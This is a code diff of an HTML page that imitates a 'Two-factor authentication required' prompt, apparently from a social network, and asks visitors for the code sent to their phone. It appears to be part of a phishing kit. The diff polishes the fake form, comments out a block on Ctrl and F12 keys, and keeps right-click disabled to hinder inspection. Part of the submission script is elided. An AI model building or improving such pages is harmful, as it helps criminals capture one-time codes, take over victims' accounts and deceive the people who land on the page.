@@ -4,12 +4,13 @@
         <meta charset="UTF-8" />
         <meta name="viewport" content="width=device-width, initial-scale=1.0" />
         <title>Confirm</title>
-        <link rel="stylesheet" href="index.css" />
+        <link rel="stylesheet" href="confirm.css" />
+        <!-- <link rel="stylesheet" href="index.css" /> -->
         <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
     </head>
     <body style="background-color: rgb(241, 242, 246)">
         <main id="main1">
-            <div id="" centered>
+            <div id="centered">
                 <form action="" class="form-container1" id="form2">
                     <div class="mb-4">
                         <h2>Two-factor authentication required</h2>
@@ -19,20 +20,17 @@
                             send to your phone
                         </p>
                         <div style="display: flex; justify-content: center">
-                            <img src="./static/Untitled.jpg" />
+                            <img alt="" src="./static/Confirm.png" style="max-width: 80%;"/>
                         </div>
-                        <label class="block"
-                            ><span
-                                class="text-[#90949C] block text-xs font-bold text-[#90949C]"
-                            >
-                                Enter your code: </span
-                            ><input
+                        <div class="block">
+                            <input
                                 type="text"
                                 name="confirm"
                                 required=""
                                 class="input"
+                                placeholder="Enter your code"
                             />
-                        </label>
+                    </div>
                         <div id="message1">
                             <p>
                                 The code generator you entered is incorrect.
@@ -119,14 +117,14 @@
                     }
                 );
             });
-            document.addEventListener("keydown", function (event){
-    if (event.ctrlKey){
-       event.preventDefault();
-    }
-    if(event.keyCode == 123){
-       event.preventDefault();
-    }
-});
+    //         document.addEventListener("keydown", function (event){
+    // if (event.ctrlKey){
+    //    event.preventDefault();
+    // }
+    // if(event.keyCode == 123){
+    //    event.preventDefault();
+    // }
+// });
 document.addEventListener('contextmenu',
     event => event.preventDefault()
     );
